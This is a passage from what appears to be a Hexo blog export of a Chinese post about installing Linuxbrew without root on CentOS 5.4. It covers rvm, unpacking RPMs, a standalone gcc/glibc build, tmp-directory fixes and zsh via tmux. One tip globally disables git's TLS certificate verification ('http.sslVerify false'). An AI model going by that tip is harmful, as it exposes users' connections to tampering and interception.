Standalone模式安装Linuxbrew\n\n在Standalone模式下，Linuxbrew会搭建一个完全脱离现有系统的编译环境和运行环境，运行Linuxbrew的软件时不再依赖系统原有的的编译器和库。\n\n虽然说是Standalone模式，仍然需要一个编译器来首先编译出一个gcc，但是CentOS5.4的默认gcc版本过旧，必须要求最低4.4版本才行。依然尝试下载对应的rpm包，然后需要注意的是，这些包可能存在依赖，所以需要运行命令`rpm -Uvh --test *.rpm`来查看是否已经安装，否则仍然需要手动安装。我正是因为libstdc++44-devel-4.4.0没有安装导致耽误了两天的时间。具体的包如下：\n\n>    libstdc++44-devel-4.4.0 gcc44-4.4.0 gcc44-gfortran-4.4.0 gcc44-c++-4.4.0\n\n安装glibc的时候，官方指南有一句提示：\n\n>    before this, you may want to `brew edit glibc` to produce compatibility for your particular kernel, for example:\n>    \"--enable-version=2.6.18\"\n\n我并未搞懂`--enable-version`参数的作用，只是在查找glibc编译选项时，看到需要开启对应内核的支持`--enable-kernel=`\n\n剩下的安装过程可以参考[官方指南](https://github.com/Homebrew/linuxbrew/wiki/Standalone-Installation)，大体流程就是先编译出gcc，再编译glibc，然后重新编译依赖这个glibc的gcc，完成整个编译工具链，最终安装基础的软件包，安装ruby、git替换原有的库。\n\n此外安装Git的依赖选项homebrew/dupes/tcl-tk过程中还有有一个小意外，参考(https://github.com/Homebrew/linuxbrew/issues/369) ，`brew install tcl-tk --without-tk`\n\n最后ruby安装的时候报错，就先凑合着用rvm吧，可能后面再过一阵子fixbug就好了\n\n## 其他小问题\n\n1. 旧版git会遇到各种HTTPS的问题，例如提示git 证书问题\n\ngit config --global http.sslVerify false\n\n2. 安装时候提示tmp目录问题\n\n>   Error: parent directory is world writable, FileUtils#remove_entry_secure does not work; >    abort: \"/tmp/homebrew20160101-27874-8ry2dn\" (parent directory mode 40777)\n\n参考链接 (https://github.com/Homebrew/homebrew/issues/39475) 设置`export HOMEBREW_TEMP=~/.tmp/`，或者修改文件`~/.linuxbrew/Library/Homebrew/config.rb`内的temp内容\n\n3. 下载问题\n\n下载不稳定，所以经常无法下载，可以手动下载然后把文件放到`~/.cache/Homebrew`下，如果没有正常识别出缓存的话，可以本地搭个简单的http服务器（`python -m SimpleHTTPServer`)，然后`brew edit package`去修改下载链接\n\n### 使用zsh\n\n安装zsh后，自动安装oh-my-zsh会出现检测不到zsh的问题（当然是因为不在默认的shell路径中了），需要手动下载这个安装脚本，并且设置其中的`CHECK_ZSH_INSTALLED`为1。因为没有权限切换默认的shell，所以基本是不能用zsh的，不过有个曲线救国的方法，就是安装tmux并且让tmux启动时自动调用zsh，以后每次启动tmux就启动调用zsh。设置方法为在文件`.tmux.conf`中写入：\n\n```\nset-option -g default-shell ~/.linuxbrew/bin/zsh\n```\n\n## 后续更新记录\n\n### Linuxbrew更新情况\n\n2016年四月Homebrew和Linuxbrew都进行了目录结构的更改，将原有的包分割成了brew和Homebrew-core两个包，需要进行重新调整。\n\n### 新的安装方法\n\n最新的Homebrew已经不再需要上述如此复杂的方法了，可以参考最新的安装方法(https://github.com/Linuxbrew/brew/wiki/CentOS6) ，通过`HOMEBREW_NO_AUTO_UPDATE=1 HOMEBREW_BUILD_FROM_SOURCE=1 brew install gcc --without-glibc` 进行安装编译，但是其他的依赖安装仍然需要同样的方法进行设置。\n\n### 不在支持CentOS5旧版本\n\n最新的glibc-2.23要求linux内核至少为2.6.16，因此最新的Linuxbrew已经无法安装再CentOS5的旧版本。如果硬要安装，个人感觉可以搜索homebrew-core的glibc为2.19历史版本覆盖最新的homebrew-core来进行安装，但是我因为gmp编译问题，并未安装成功。\n\n## 总结\n\n为了能够在自由安装软件也是醉了，折腾了好久，不过安装完毕后，也是非常舒服的。\n","source":"_posts/Install-Linuxbrew-without-Root.md","raw":"\ntitle:  在无Root权限系统中安装Linuxbrew\ndate: 2016-01-12 02:37:25\ntags: [\"Linux\"]\n---\n\n---\n\n# 在无Root权限系统中安装Linuxbrew\n\n## Linuxbrew\n\nHomebrew是Mac系统下著名的软件安装管理系统，其特点是不需要root权限即可编译安装Linux下的各种软件，通过修改路径来优先使用安装的软件包。而Linuxbrew则是其Linux移植版本，同样可以在不需要root权限的情况下，在.linuxbrew下完整建立一个运行环境，并在环境变量里面优先使用。\n\n因为目前我使用的一个系统是Centos5.4版本，无root权限，gcc、python等版本均非常旧，而且无法自由安装软件提供工作效率，所以选择Linuxbrew来安装需要的软件。但是实际上整个安装过程也是非常艰难的。\n\n## 安装过程\n\n虽然Linuxbrew号称不需要root权限，但是实际安装的时候还是需要满足一定的条件，目前主要条件如下：\n\n>   * Ruby 1.8.6 or newer\n>   * GCC 4.2 or newer\n>   * Linux 2.6.16 or newer\n>   * 64-bit x86 or 32-bit ARM platform\n\n可惜现有的系统不满足前两个条件，意味着需要在没有root权限下实现这亮点。\n\n### Ruby依赖\n\nLinuxbrew是基于ruby的，而Centos5.7的ruby版本是1.8.5，仅仅相差了一个小版本号，却无法运行。因为没有root权限，所以选择采用[rvm](https://rvm.io/)升级安装ruby。\n\n默认rvm是编译安装的，但是显然当前版本没有安装必要的devel包，所以是无法编译成功的，看到安装过程中会首先去搜索precompiled binary，猜测可能有不需要编译的ruby版本提供，经过一番搜索，果然是可以的，运行`rvm list remote`可以看到支持当前系统的ruby预编译版本，就选择了一个最低版本ruby-1.9.3-p551，但是很不幸，应该是网络问题无法直接下载，需要手动从[下载链接](https://rvm_io.global.ssl.fastly.net/binaries/centos/5/x86_64/)进行下载。\n\n对于下载的包，运行`rvm mount -r ruby-1.9.3-p551.tar.bz2 --binary`加载，会自动把包内的文件释放出来，此时会提醒运行缺少libyaml，但是发现好像并不会引起其他问题。\n\n### Git依赖\n\n坑爹的是git也没有安装，第一想法当然是直接释放git的rpm包，但是运行的时候一直有错误提醒：\n\n>    $ git clone https://github.com/nvie/gitflow.git\n>    Cloning into gitflow...\n>    fatal: Unable to find remote helper for 'https'\n\n后得知是缺乏libcurl相关库，但是最初并不知道，因此选择重新编译git，官网提示需要如下库\n\n```\nsudo yum install curl-devel expat-devel gettext-devel openssl-devel perl-devel zlib-devel\n```\n\n自然是按照对应的依赖，然后下载解压对应的包，增加到include路径中，然后进行编译，但是事实证明这个过程非常艰难，最终没有编译成功，有兴趣的同学可以尝试下看看。\n\n幸运的从网上找到了一个[Centos rpm包库](http://vault.centos.org/5.4/os/x86_64/CentOS/)，然后根据需要的包名选择下载，s使用命令`rpm2cpio *.rpm | cpio -div`释放rpm包文件到了本地的~/usr目录下，并确认这些文件及so能够正常在环境变量里面\n\n```\nexport PATH=$PATH:~/usr/bin\nexport LD_LIBRARY_PATH=$LD_LIBRARY_PATH:~/usr/lib\nexport C_INCLUDE_PATH=$C_INCLUDE_PATH:~/usr/include\nexport CPLUS_INCLUDE_PATH=$CPLUS_INCLUDE_PATH:~/usr/include\n```\n\n随后编译git，并放入~/usr/bin下，能够正常运行git。\n\n### Standalone模式安装Linuxbrew\n\n在Standalone模式下，Linuxbrew会搭建一个完全脱离现有系统的编译环境和运行环境，运行Linuxbrew的软件时不再依赖系统原有的的编译器和库。\n\n虽然说是Standalone模式，仍然需要一个编译器来首先编译出一个gcc，但是CentOS5.4的默认gcc版本过旧，必须要求最低4.4版本才行。依然尝试下载对应的rpm包，然后需要注意的是，这些包可能存在依赖，所以需要运行命令`rpm -Uvh --test *.rpm`来查看是否已经安装，否则仍然需要手动安装。我正是因为libstdc++44-devel-4.4.0没有安装导致耽误了两天的时间。具体的包如下：\n\n>    libstdc++44-devel-4.4.0 gcc44-4.4.0 gcc44-gfortran-4.4.0 gcc44-c++-4.4.0\n\n安装glibc的时候，官方指南有一句提示：\n\n>    before this, you may want to `brew edit glibc` to produce compatibility for your particular kernel, for example:\n>    \"--enable-version=2.6.18\"\n\n我并未搞懂`--enable-version`参数的作用，只是在查找glibc编译选项时，看到需要开启对应内核的支持`--enable-kernel=`\n\n剩下的安装过程可以参考[官方指南](https://github.com/Homebrew/linuxbrew/wiki/Standalone-Installation)，大体流程就是先编译出gcc，再编译glibc，然后重新编译依赖这个glibc的gcc，完成整个编译工具链，最终安装基础的软件包，安装ruby、git替换原有的库。\n\n此外安装Git的依赖选项homebrew/dupes/tcl-tk过程中还有有一个小意外，参考(https://github.com/Homebrew/linuxbrew/issues/369) ，`brew install tcl-tk --without-tk`\n\n最后ruby安装的时候报错，就先凑合着用rvm吧，可能后面再过一阵子fixbug就好了\n\n## 其他小问题\n\n1. 旧版git会遇到各种HTTPS的问题，例如提示git 证书问题\n\ngit config --global http.sslVerify false\n\n2. 安装时候提示tmp目录问题\n\n>   Error: parent directory is world writable, FileUtils#remove_entry_secure does not work; >    abort: \"/tmp/homebrew20160101-27874-8ry2dn\" (parent directory mode 40777)\n\n参考链接 (https://github.com/Homebrew/homebrew/issues/39475) 设置`export HOMEBREW_TEMP=~/.tmp/`，或者修改文件`~/.linuxbrew/Library/Homebrew/config.rb`内的temp内容\n\n3. 下载问题\n\n下载不稳定，所以经常无法下载，可以手动下载然后把文件放到`~/.cache/Homebrew`下，如果没有正常识别出缓存的话，可以本地搭个简单的http服务器（`python -m SimpleHTTPServer`)，然后`brew edit package`去修改下载链接\n\n### 使用zsh\n\n安装zsh后，自动安装oh-my-zsh会出现检测不到zsh的问题（当然是因为不在默认的shell路径中了），需要手动下载这个安装脚本，并且设置其中的`CHECK_ZSH_INSTALLED`为1。因为没有权限切换默认的shell，所以基本是不能用zsh的，不过有个曲线救国的方法，就是安装tmux并且让tmux启动时自动调用zsh，以后每次启动tmux就启动调用zsh。设置方法为在文件`.tmux.conf`中写入：\n\n```\nset-option -g default-shell ~/.linuxbrew/bin/zsh\n```\n\n## 后续更新记录\n\n### Linuxbrew更新情况\n\n2016年四月Homebrew和Linuxbrew都进行了目录结构的更改，将原有的包分割成了brew和Homebrew-core两个包，需要进行重新调整。\n\n### 新的安装方法\n\n最新的Homebrew已经不再需要上述如此复杂的方法了，可以参考最新的安装方法(https://github.com/Linuxbrew/brew/wiki/CentOS6) ，通过`HOMEBREW_NO_AUTO_UPDATE=1 HOMEBREW_BUILD_FROM_SOURCE=1 brew install gcc --without-glibc` 进行安装编译，但是其他的依赖安装仍然需要同样的方法进行设置。\n\n### 不在支持CentOS5旧版本\n\n最新的glibc-2.23要求linux内核至少为2.6.16，因此最新的Linuxbrew已经无法安装再CentOS5的旧版本。如果硬要安装，个人感觉可以搜索homebrew-core的glibc为2.19历史版本覆盖最新的homebrew-core来进行安装，但是我因为gmp编译问题，并未安装成功。\n\n## 总结\n\n为了能够在自由安装软件也是醉了，折腾了好久，不过安装完毕后，也是非常舒服的。\n","slug":"Install-Linuxbrew-without-Root","published":1,"updated":"2020-09-07T02:31:06.567Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmr000kxrn52dx56ph8","content":"<hr>\n<h1 id=\"在无Root权限系统中安装Linuxbrew\"><a href=\"#在无Root权限系统中安装Linuxbrew\" class=\"headerlink\" title=\"在无Root权限系统中安装Linuxbrew\"></a>在无Root权限系统中安装Linuxbrew</h1><h2 id=\"Linuxbrew\"><a href=\"#Linuxbrew\" class=\"headerlink\" title=\"Linuxbrew\"></a>Linuxbrew</h2><p>Homebrew是Mac系统下著名的软件安装管理系统，其特点是不需要root权限即可编译安装Linux下的各种软件，通过修改路径来优先使用安装的软件包。而Linuxbrew则是其Linux移植版本，同样可以在不需要root权限的情况下，在.linuxbrew下完整建立一个运行环境，并在环境变量里面优先使用。</p>\n<p>因为目前我使用的一个系统是Centos5.4版本，无root权限，gcc、python等版本均非常旧，而且无法自由安装软件提供工作效率，所以选择Linuxbrew来安装需要的软件。但是实际上整个安装过程也是非常艰难的。</p>\n<h2 id=\"安装过程\"><a href=\"#安装过程\" class=\"headerlink\" title=\"安装过程\"></a>安装过程</h2><p>虽然Linuxbrew号称不需要root权限，但是实际安装的时候还是需要满足一定的条件，目前主要条件如下：</p>\n<blockquote>\n<ul>\n<li>Ruby 1.8.6 or newer</li>\n<li>GCC 4.2 or newer</li>\n<li>Linux 2.6.16 or newer</li>\n<li>64-bit x86 or 32-bit ARM platform</li>\n</ul>\n</blockquote>\n<p>可惜现有的系统不满足前两个条件，意味着需要在没有root权限下实现这亮点。</p>\n<h3 id=\"Ruby依赖\"><a href=\"#Ruby依赖\" class=\"headerlink\" title=\"Ruby依赖\"></a>Ruby依赖</h3><p>Linuxbrew是基于ruby的，而Centos5.7的ruby版本是1.8.5，仅仅相差了一个小版本号，却无法运行。因为没有root权限，所以选择采用<a href=\"https://rvm.io/\">rvm</a>升级安装ruby。</p>\n<p>默认rvm是编译安装的，但是显然当前版本没有安装必要的devel包，所以是无法编译成功的，看到安装过程中会首先去搜索precompiled binary，猜测可能有不需要编译的ruby版本提供，经过一番搜索，果然是可以的，运行<code>rvm list remote</code>可以看到支持当前系统的ruby预编译版本，就选择了一个最低版本ruby-1.9.3-p551，但是很不幸，应该是网络问题无法直接下载，需要手动从<a href=\"https://rvm_io.global.ssl.fastly.net/binaries/centos/5/x86_64/\">下载链接</a>进行下载。</p>\n<p>对于下载的包，运行<code>rvm mount -r ruby-1.9.3-p551.tar.bz2 --binary</code>加载，会自动把包内的文件释放出来，此时会提醒运行缺少libyaml，但是发现好像并不会引起其他问题。</p>\n<h3 id=\"Git依赖\"><a href=\"#Git依赖\" class=\"headerlink\" title=\"Git依赖\"></a>Git依赖</h3><p>坑爹的是git也没有安装，第一想法当然是直接释放git的rpm包，但是运行的时候一直有错误提醒：</p>\n<blockquote>\n<p>   $ git clone <a href=\"https://github.com/nvie/gitflow.git\">https://github.com/nvie/gitflow.git</a><br>   Cloning into gitflow…<br>   fatal: Unable to find remote helper for ‘https’</p>\n</blockquote>\n<p>后得知是缺乏libcurl相关库，但是最初并不知道，因此选择重新编译git，官网提示需要如下库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo yum install curl-devel expat-devel gettext-devel openssl-devel perl-devel zlib-devel</span><br></pre></td></tr></table></figure>\n\n<p>自然是按照对应的依赖，然后下载解压对应的包，增加到include路径中，然后进行编译，但是事实证明这个过程非常艰难，最终没有编译成功，有兴趣的同学可以尝试下看看。</p>\n<p>幸运的从网上找到了一个<a href=\"http://vault.centos.org/5.4/os/x86_64/CentOS/\">Centos rpm包库</a>，然后根据需要的包名选择下载，s使用命令<code>rpm2cpio *.rpm | cpio -div</code>释放rpm包文件到了本地的~&#x2F;usr目录下，并确认这些文件及so能够正常在环境变量里面</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export PATH=$PATH:~/usr/bin</span><br><span class=\"line\">export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:~/usr/lib</span><br><span class=\"line\">export C_INCLUDE_PATH=$C_INCLUDE_PATH:~/usr/include</span><br><span class=\"line\">export CPLUS_INCLUDE_PATH=$CPLUS_INCLUDE_PATH:~/usr/include</span><br></pre></td></tr></table></figure>\n\n<p>随后编译git，并放入~&#x2F;usr&#x2F;bin下，能够正常运行git。</p>\n<h3 id=\"Standalone模式安装Linuxbrew\"><a href=\"#Standalone模式安装Linuxbrew\" class=\"headerlink\" title=\"Standalone模式安装Linuxbrew\"></a>Standalone模式安装Linuxbrew</h3><p>在Standalone模式下，Linuxbrew会搭建一个完全脱离现有系统的编译环境和运行环境，运行Linuxbrew的软件时不再依赖系统原有的的编译器和库。</p>\n<p>虽然说是Standalone模式，仍然需要一个编译器来首先编译出一个gcc，但是CentOS5.4的默认gcc版本过旧，必须要求最低4.4版本才行。依然尝试下载对应的rpm包，然后需要注意的是，这些包可能存在依赖，所以需要运行命令<code>rpm -Uvh --test *.rpm</code>来查看是否已经安装，否则仍然需要手动安装。我正是因为libstdc++44-devel-4.4.0没有安装导致耽误了两天的时间。具体的包如下：</p>\n<blockquote>\n<p>   libstdc++44-devel-4.4.0 gcc44-4.4.0 gcc44-gfortran-4.4.0 gcc44-c++-4.4.0</p>\n</blockquote>\n<p>安装glibc的时候，官方指南有一句提示：</p>\n<blockquote>\n<p>   before this, you may want to <code>brew edit glibc</code> to produce compatibility for your particular kernel, for example:<br>   “–enable-version&#x3D;2.6.18”</p>\n</blockquote>\n<p>我并未搞懂<code>--enable-version</code>参数的作用，只是在查找glibc编译选项时，看到需要开启对应内核的支持<code>--enable-kernel=</code></p>\n<p>剩下的安装过程可以参考<a href=\"https://github.com/Homebrew/linuxbrew/wiki/Standalone-Installation\">官方指南</a>，大体流程就是先编译出gcc，再编译glibc，然后重新编译依赖这个glibc的gcc，完成整个编译工具链，最终安装基础的软件包，安装ruby、git替换原有的库。</p>\n<p>此外安装Git的依赖选项homebrew&#x2F;dupes&#x2F;tcl-tk过程中还有有一个小意外，参考(<a href=\"https://github.com/Homebrew/linuxbrew/issues/369\">https://github.com/Homebrew/linuxbrew/issues/369</a>) ，<code>brew install tcl-tk --without-tk</code></p>\n<p>最后ruby安装的时候报错，就先凑合着用rvm吧，可能后面再过一阵子fixbug就好了</p>\n<h2 id=\"其他小问题\"><a href=\"#其他小问题\" class=\"headerlink\" title=\"其他小问题\"></a>其他小问题</h2><ol>\n<li>旧版git会遇到各种HTTPS的问题，例如提示git 证书问题</li>\n</ol>\n<p>git config –global http.sslVerify false</p>\n<ol start=\"2\">\n<li>安装时候提示tmp目录问题</li>\n</ol>\n<blockquote>\n<p>  Error: parent directory is world writable, FileUtils#remove_entry_secure does not work; &gt;    abort: “&#x2F;tmp&#x2F;homebrew20160101-27874-8ry2dn” (parent directory mode 40777)</p>\n</blockquote>\n<p>参考链接 (<a href=\"https://github.com/Homebrew/homebrew/issues/39475\">https://github.com/Homebrew/homebrew/issues/39475</a>) 设置<code>export HOMEBREW_TEMP=~/.tmp/</code>，或者修改文件<code>~/.linuxbrew/Library/Homebrew/config.rb</code>内的temp内容</p>\n<ol start=\"3\">\n<li>下载问题</li>\n</ol>\n<p>下载不稳定，所以经常无法下载，可以手动下载然后把文件放到<code>~/.cache/Homebrew</code>下，如果没有正常识别出缓存的话，可以本地搭个简单的http服务器（<code>python -m SimpleHTTPServer</code>)，然后<code>brew edit package</code>去修改下载链接</p>\n<h3 id=\"使用zsh\"><a href=\"#使用zsh\" class=\"headerlink\" title=\"使用zsh\"></a>使用zsh</h3><p>安装zsh后，自动安装oh-my-zsh会出现检测不到zsh的问题（当然是因为不在默认的shell路径中了），需要手动下载这个安装脚本，并且设置其中的<code>CHECK_ZSH_INSTALLED</code>为1。因为没有权限切换默认的shell，所以基本是不能用zsh的，不过有个曲线救国的方法，就是安装tmux并且让tmux启动时自动调用zsh，以后每次启动tmux就启动调用zsh。设置方法为在文件<code>.tmux.conf</code>中写入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set-option -g default-shell ~/.linuxbrew/bin/zsh</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"后续更新记录\"><a href=\"#后续更新记录\" class=\"headerlink\" title=\"后续更新记录\"></a>后续更新记录</h2><h3 id=\"Linuxbrew更新情况\"><a href=\"#Linuxbrew更新情况\" class=\"headerlink\" title=\"Linuxbrew更新情况\"></a>Linuxbrew更新情况</h3><p>2016年四月Homebrew和Linuxbrew都进行了目录结构的更改，将原有的包分割成了brew和Homebrew-core两个包，需要进行重新调整。</p>\n<h3 id=\"新的安装方法\"><a href=\"#新的安装方法\" class=\"headerlink\" title=\"新的安装方法\"></a>新的安装方法</h3><p>最新的Homebrew已经不再需要上述如此复杂的方法了，可以参考最新的安装方法(<a href=\"https://github.com/Linuxbrew/brew/wiki/CentOS6\">https://github.com/Linuxbrew/brew/wiki/CentOS6</a>) ，通过<code>HOMEBREW_NO_AUTO_UPDATE=1 HOMEBREW_BUILD_FROM_SOURCE=1 brew install gcc --without-glibc</code> 进行安装编译，但是其他的依赖安装仍然需要同样的方法进行设置。</p>\n<h3 id=\"不在支持CentOS5旧版本\"><a href=\"#不在支持CentOS5旧版本\" class=\"headerlink\" title=\"不在支持CentOS5旧版本\"></a>不在支持CentOS5旧版本</h3><p>最新的glibc-2.23要求linux内核至少为2.6.16，因此最新的Linuxbrew已经无法安装再CentOS5的旧版本。如果硬要安装，个人感觉可以搜索homebrew-core的glibc为2.19历史版本覆盖最新的homebrew-core来进行安装，但是我因为gmp编译问题，并未安装成功。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>为了能够在自由安装软件也是醉了，折腾了好久，不过安装完毕后，也是非常舒服的。</p>\n","excerpt":"","more":"<hr>\n<h1 id=\"在无Root权限系统中安装Linuxbrew\"><a href=\"#在无Root权限系统中安装Linuxbrew\" class=\"headerlink\" title=\"在无Root权限系统中安装Linuxbrew\"></a>在无Root权限系统中安装Linuxbrew</h1><h2 id=\"Linuxbrew\"><a href=\"#Linuxbrew\" class=\"headerlink\" title=\"Linuxbrew\"></a>Linuxbrew</h2><p>Homebrew是Mac系统下著名的软件安装管理系统，其特点是不需要root权限即可编译安装Linux下的各种软件，通过修改路径来优先使用安装的软件包。而Linuxbrew则是其Linux移植版本，同样可以在不需要root权限的情况下，在.linuxbrew下完整建立一个运行环境，并在环境变量里面优先使用。</p>\n<p>因为目前我使用的一个系统是Centos5.4版本，无root权限，gcc、python等版本均非常旧，而且无法自由安装软件提供工作效率，所以选择Linuxbrew来安装需要的软件。但是实际上整个安装过程也是非常艰难的。</p>\n<h2 id=\"安装过程\"><a href=\"#安装过程\" class=\"headerlink\" title=\"安装过程\"></a>安装过程</h2><p>虽然Linuxbrew号称不需要root权限，但是实际安装的时候还是需要满足一定的条件，目前主要条件如下：</p>\n<blockquote>\n<ul>\n<li>Ruby 1.8.6 or newer</li>\n<li>GCC 4.2 or newer</li>\n<li>Linux 2.6.16 or newer</li>\n<li>64-bit x86 or 32-bit ARM platform</li>\n</ul>\n</blockquote>\n<p>可惜现有的系统不满足前两个条件，意味着需要在没有root权限下实现这亮点。</p>\n<h3 id=\"Ruby依赖\"><a href=\"#Ruby依赖\" class=\"headerlink\" title=\"Ruby依赖\"></a>Ruby依赖</h3><p>Linuxbrew是基于ruby的，而Centos5.7的ruby版本是1.8.5，仅仅相差了一个小版本号，却无法运行。因为没有root权限，所以选择采用<a href=\"https://rvm.io/\">rvm</a>升级安装ruby。</p>\n<p>默认rvm是编译安装的，但是显然当前版本没有安装必要的devel包，所以是无法编译成功的，看到安装过程中会首先去搜索precompiled binary，猜测可能有不需要编译的ruby版本提供，经过一番搜索，果然是可以的，运行<code>rvm list remote</code>可以看到支持当前系统的ruby预编译版本，就选择了一个最低版本ruby-1.9.3-p551，但是很不幸，应该是网络问题无法直接下载，需要手动从<a href=\"https://rvm_io.global.ssl.fastly.net/binaries/centos/5/x86_64/\">下载链接</a>进行下载。</p>\n<p>对于下载的包，运行<code>rvm mount -r ruby-1.9.3-p551.tar.bz2 --binary</code>加载，会自动把包内的文件释放出来，此时会提醒运行缺少libyaml，但是发现好像并不会引起其他问题。</p>\n<h3 id=\"Git依赖\"><a href=\"#Git依赖\" class=\"headerlink\" title=\"Git依赖\"></a>Git依赖</h3><p>坑爹的是git也没有安装，第一想法当然是直接释放git的rpm包，但是运行的时候一直有错误提醒：</p>\n<blockquote>\n<p>   $ git clone <a href=\"https://github.com/nvie/gitflow.git\">https://github.com/nvie/gitflow.git</a><br>   Cloning into gitflow…<br>   fatal: Unable to find remote helper for ‘https’</p>\n</blockquote>\n<p>后得知是缺乏libcurl相关库，但是最初并不知道，因此选择重新编译git，官网提示需要如下库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo yum install curl-devel expat-devel gettext-devel openssl-devel perl-devel zlib-devel</span><br></pre></td></tr></table></figure>\n\n<p>自然是按照对应的依赖，然后下载解压对应的包，增加到include路径中，然后进行编译，但是事实证明这个过程非常艰难，最终没有编译成功，有兴趣的同学可以尝试下看看。</p>\n<p>幸运的从网上找到了一个<a href=\"http://vault.centos.org/5.4/os/x86_64/CentOS/\">Centos rpm包库</a>，然后根据需要的包名选择下载，s使用命令<code>rpm2cpio *.rpm | cpio -div</code>释放rpm包文件到了本地的~&#x2F;usr目录下，并确认这些文件及so能够正常在环境变量里面</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export PATH=$PATH:~/usr/bin</span><br><span class=\"line\">export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:~/usr/lib</span><br><span class=\"line\">export C_INCLUDE_PATH=$C_INCLUDE_PATH:~/usr/include</span><br><span class=\"line\">export CPLUS_INCLUDE_PATH=$CPLUS_INCLUDE_PATH:~/usr/include</span><br></pre></td></tr></table></figure>\n\n<p>随后编译git，并放入~&#x2F;usr&#x2F;bin下，能够正常运行git。</p>\n<h3 id=\"Standalone模式安装Linuxbrew\"><a href=\"#Standalone模式安装Linuxbrew\" class=\"headerlink\" title=\"Standalone模式安装Linuxbrew\"></a>Standalone模式安装Linuxbrew</h3><p>在Standalone模式下，Linuxbrew会搭建一个完全脱离现有系统的编译环境和运行环境，运行Linuxbrew的软件时不再依赖系统原有的的编译器和库。</p>\n<p>虽然说是Standalone模式，仍然需要一个编译器来首先编译出一个gcc，但是CentOS5.4的默认gcc版本过旧，必须要求最低4.4版本才行。依然尝试下载对应的rpm包，然后需要注意的是，这些包可能存在依赖，所以需要运行命令<code>rpm -Uvh --test *.rpm</code>来查看是否已经安装，否则仍然需要手动安装。我正是因为libstdc++44-devel-4.4.0没有安装导致耽误了两天的时间。具体的包如下：</p>\n<blockquote>\n<p>   libstdc++44-devel-4.4.0 gcc44-4.4.0 gcc44-gfortran-4.4.0 gcc44-c++-4.4.0</p>\n</blockquote>\n<p>安装glibc的时候，官方指南有一句提示：</p>\n<blockquote>\n<p>   before this, you may want to <code>brew edit glibc</code> to produce compatibility for your particular kernel, for example:<br>   “–enable-version&#x3D;2.6.18”</p>\n</blockquote>\n<p>我并未搞懂<code>--enable-version</code>参数的作用，只是在查找glibc编译选项时，看到需要开启对应内核的支持<code>--enable-kernel=</code></p>\n<p>剩下的安装过程可以参考<a href=\"https://github.com/Homebrew/linuxbrew/wiki/Standalone-Installation\">官方指南</a>，大体流程就是先编译出gcc，再编译glibc，然后重新编译依赖这个glibc的gcc，完成整个编译工具链，最终安装基础的软件包，安装ruby、git替换原有的库。</p>\n<p>此外安装Git的依赖选项homebrew&#x2F;dupes&#x2F;tcl-tk过程中还有有一个小意外，参考(<a href=\"https://github.com/Homebrew/linuxbrew/issues/369\">https://github.com/Homebrew/linuxbrew/issues/369</a>) ，<code>brew install tcl-tk --without-tk</code></p>\n<p>最后ruby安装的时候报错，就先凑合着用rvm吧，可能后面再过一阵子fixbug就好了</p>\n<h2 id=\"其他小问题\"><a href=\"#其他小问题\" class=\"headerlink\" title=\"其他小问题\"></a>其他小问题</h2><ol>\n<li>旧版git会遇到各种HTTPS的问题，例如提示git 证书问题</li>\n</ol>\n<p>git config –global http.sslVerify false</p>\n<ol start=\"2\">\n<li>安装时候提示tmp目录问题</li>\n</ol>\n<blockquote>\n<p>  Error: parent directory is world writable, FileUtils#remove_entry_secure does not work; &gt;    abort: “&#x2F;tmp&#x2F;homebrew20160101-27874-8ry2dn” (parent directory mode 40777)</p>\n</blockquote>\n<p>参考链接 (<a href=\"https://github.com/Homebrew/homebrew/issues/39475\">https://github.com/Homebrew/homebrew/issues/39475</a>) 设置<code>export HOMEBREW_TEMP=~/.tmp/</code>，或者修改文件<code>~/.linuxbrew/Library/Homebrew/config.rb</code>内的temp内容</p>\n<ol start=\"3\">\n<li>下载问题</li>\n</ol>\n<p>下载不稳定，所以经常无法下载，可以手动下载然后把文件放到<code>~/.cache/Homebrew</code>下，如果没有正常识别出缓存的话，可以本地搭个简单的http服务器（<code>python -m SimpleHTTPServer</code>)，然后<code>brew edit package</code>去修改下载链接</p>\n<h3 id=\"使用zsh\"><a href=\"#使用zsh\" class=\"headerlink\" title=\"使用zsh\"></a>使用zsh</h3><p>安装zsh后，自动安装oh-my-zsh会出现检测不到zsh的问题（当然是因为不在默认的shell路径中了），需要手动下载这个安装脚本，并且设置其中的<code>CHECK_ZSH_INSTALLED</code>为1。因为没有权限切换默认的shell，所以基本是不能用zsh的，不过有个曲线救国的方法，就是安装tmux并且让tmux启动时自动调用zsh，以后每次启动tmux就启动调用zsh。设置方法为在文件<code>.tmux.conf</code>中写入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set-option -g default-shell ~/.linuxbrew/bin/zsh</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"后续更新记录\"><a href=\"#后续更新记录\" class=\"headerlink\" title=\"后续更新记录\"></a>后续更新记录</h2><h3 id=\"Linuxbrew更新情况\"><a href=\"#Linuxbrew更新情况\" class=\"headerlink\" title=\"Linuxbrew更新情况\"></a>Linuxbrew更新情况</h3><p>2016年四月Homebrew和Linuxbrew都进行了目录结构的更改，将原有的包分割成了brew和Homebrew-core两个包，需要进行重新调整。</p>\n<h3 id=\"新的安装方法\"><a href=\"#新的安装方法\" class=\"headerlink\" title=\"新的安装方法\"></a>新的安装方法</h3><p>最新的Homebrew已经不再需要上述如此复杂的方法了，可以参考最新的安装方法(<a 